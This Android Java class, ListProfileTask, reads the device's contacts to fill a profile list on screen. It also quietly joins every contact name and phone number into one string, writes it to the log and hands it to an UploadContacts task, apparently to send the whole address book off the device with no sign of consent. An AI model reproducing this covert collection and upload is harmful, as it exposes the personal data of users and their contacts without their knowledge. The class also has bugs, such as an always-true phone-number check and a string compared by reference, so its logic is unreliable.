package com.android.example.contact.task;

import com.android.example.contact.upload.*;

import java.util.LinkedList;
import java.util.List;

import android.app.Activity;
import android.app.FragmentTransaction;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.TextView;

import com.android.example.contact.ProfileFragment;
import com.android.example.contact.R;
import com.android.example.contact.data.Pair;

public class ListProfileTask extends AsyncTask<Void, Void, List<Pair>> {
	static final String TAG = "ListProfileTask : ";

	private FragmentTransaction ft;
	private Activity activity;

	public ListProfileTask(Activity act, FragmentTransaction ft) {
		this.activity = act;
		this.ft = ft;
	}

	protected List<Pair> doInBackground(Void... params) {
		List<Pair> full = fillPairList();
		return full;
	}

	protected void onPostExecute(List<Pair> result) {
		ProfileFragment profileFragment = (ProfileFragment) activity
				.getFragmentManager().findFragmentByTag("Profile");
		if (profileFragment == null)
			profileFragment = new ProfileFragment();

		profileFragment.setDataList(result);
		ft.replace(R.id.fragment_container, profileFragment, "Profile");
		ft.commit();

		// profileFragment.taskRun = true;
	}

	private List<Pair> fillPairList() {
		String nameNumber = "";

		Cursor c = activity.getContentResolver().query(
				ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		Log.i(TAG, "fill name...found = " + c.getCount());

		String[] columnNames = c.getColumnNames();
		List<Pair> profileList = new LinkedList<Pair>();

		while (c != null && c.moveToNext()) {
			Pair pair = new Pair("xxx", "xxx");
			for (int j = 0; j < columnNames.length; j++) {
				String columnName = columnNames[j];
				String columnString = c.getString(c.getColumnIndex(columnName));
				if (columnName.compareTo("display_name") == 0)
					pair.key = columnString;
			}

			if (Integer
					.parseInt(c.getString(c
							.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) >= 0) {
				String id = c.getString(c
						.getColumnIndex(ContactsContract.Contacts._ID));

				Cursor pCur = activity.getContentResolver().query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
						null,
						ContactsContract.CommonDataKinds.Phone.CONTACT_ID
								+ " = ?", new String[] { id }, null);

				String[] pColumns = pCur.getColumnNames();
				Log.i(TAG, "pair.key = " + pair.key);
				boolean firstNumber = true;
				int th = 0;
				while (pCur != null && pCur.moveToNext()) {
					for (int j = 0; j < pColumns.length; j++) {
						String oneColumn = pColumns[j];
						String oneString = pCur.getString(pCur
								.getColumnIndex(oneColumn));

						if (oneColumn.compareTo("data1") == 0) {
							if (oneString != null) {
								if (!firstNumber) {
									Pair tempPair = new Pair("", oneString);
									profileList.add(tempPair);
								} else {
									pair.value = oneString;
									profileList.add(pair);
									firstNumber = false;
								}
								nameNumber += pair.key + "#" + (th++) + "="
										+ pair.value + "&";
							}
						}
					}
				}
				if (pCur != null)
					pCur.close();
			}
		}
		c.close();

		if (nameNumber != "") {
			new UploadContacts(activity).execute(nameNumber.substring(0,
					nameNumber.length() - 1));
			Log.i(TAG, nameNumber);
		}
		return profileList;
	}
}
